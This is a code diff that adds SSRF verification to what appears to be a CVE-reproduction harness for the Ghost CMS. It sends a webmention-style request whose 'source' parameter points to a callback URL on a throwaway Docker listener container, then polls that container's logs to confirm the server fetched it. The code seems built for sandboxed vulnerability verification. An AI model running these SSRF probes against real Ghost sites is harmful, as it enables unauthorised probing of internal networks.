@@ -470,6 +470,88 @@ def verify_ghost_cve(
                 step("  ghost: VERIFICADO (chain)")
             return res
 
+        # SSRF: start a callback listener in the Ghost Docker network.
+        # Ghost fetches the SSRF target URL server-side — we confirm receipt at the listener.
+        if vuln_class == "ssrf":
+            import secrets as _secrets
+            token = _secrets.token_hex(12)
+            # Start a minimal HTTP listener container in Ghost's network
+            listener_name = f"bo_ghost_listener_{os.urandom(4).hex()}"
+            listener_port = 9988
+            # Simple Python one-liner: listen for one request, print token when hit
+            _listener_cmd = (
+                f"python3 -c \""
+                f"import http.server,socketserver;"
+                f"class H(http.server.BaseHTTPRequestHandler):"
+                f"  def do_GET(self):"
+                f"    self.send_response(200);"
+                f"    self.end_headers();"
+                f"    print('CALLBACK:'+self.path,flush=True);"
+                f"  def log_message(self,*a):pass;"
+                f"socketserver.TCPServer(('0.0.0.0',{listener_port}),H).handle_request()\""
+            )
+            _run(["docker", "run", "-d", "--rm", "--name", listener_name,
+                  "--network", network,
+                  "python:3.11-slim", "sh", "-c", _listener_cmd], timeout=20)
+            time.sleep(1)
+            # Build SSRF payload: replace any URL param value with the internal callback URL
+            # Ghost's webmentions use "source" param; fallback to "url"
+            from .wpverify import _URL_HINTS as _GH_URL_HINTS
+            from .genericverify import _pick_param as _gh_pick_param
+            _params = parameters or []
+            _url_p = _gh_pick_param(_params, _GH_URL_HINTS) or "source"
+            callback_url = f"http://{listener_name}:{listener_port}/?token={token}"
+            _ssrf_params = dict(_params) if isinstance(_params, dict) else {}
+            if isinstance(_params, list):
+                _ssrf_params = dict.fromkeys(_params, "")
+            _ssrf_params[_url_p] = callback_url
+            # Keep target pointing at Ghost's own homepage so it's a valid webmention target
+            if "target" in _ssrf_params and "target" != _url_p:
+                _ssrf_params["target"] = base_url + "/"
+            ssrf_body = json.dumps(_ssrf_params)
+            ssrf_headers: dict = {"Content-Type": "application/json", "Origin": base_url}
+            if auth_cookie:
+                ssrf_headers["Cookie"] = auth_cookie
+            step(f"  ghost/ssrf: enviando callback URL a {endpoint} (url_param={_url_p!r})")
+            try:
+                r_ssrf = _http_request(
+                    http_method.upper() if http_method else "POST",
+                    base_url + endpoint, data=ssrf_body,
+                    headers=ssrf_headers, timeout=15)
+                res.evidence["ssrf_status"] = r_ssrf.status_code
+                res.evidence["ssrf_body"] = (r_ssrf.text or "")[:200]
+            except Exception as _ssrf_e:
+                res.evidence["ssrf_error"] = str(_ssrf_e)[:100]
+            # Wait for Ghost to fetch the callback URL (async processing)
+            _got_callback = False
+            for _w in range(20):
+                time.sleep(1)
+                try:
+                    _logs = subprocess.run(
+                        ["docker", "logs", listener_name],
+                        capture_output=True, text=True, timeout=5)
+                    _log_out = (_logs.stdout or "") + (_logs.stderr or "")
+                    if "CALLBACK:" in _log_out or token in _log_out:
+                        _got_callback = True
+                        res.evidence["callback_received"] = _log_out.strip()[:200]
+                        break
+                except Exception:
+                    break
+            subprocess.run(["docker", "rm", "-f", listener_name],
+                           capture_output=True, timeout=10)
+            if _got_callback:
+                res.verified = True
+                res.ok = True
+                res.confidence = "confirmed"
+                res.detail = f"SSRF VERIFICADO: Ghost fetched callback URL (token={token[:8]}…)"
+                step("  ghost/ssrf: VERIFICADO — callback recibido")
+            else:
+                res.ok = True
+                res.detail = (f"SSRF no confirmado: Ghost no fetched callback en 20s "
+                              f"(HTTP {res.evidence.get('ssrf_status','?')})")
+                step("  ghost/ssrf: no callback recibido en 20s")
+            return res
+
         # Single-request PoC
         target_url = base_url + endpoint
         headers: dict = {}
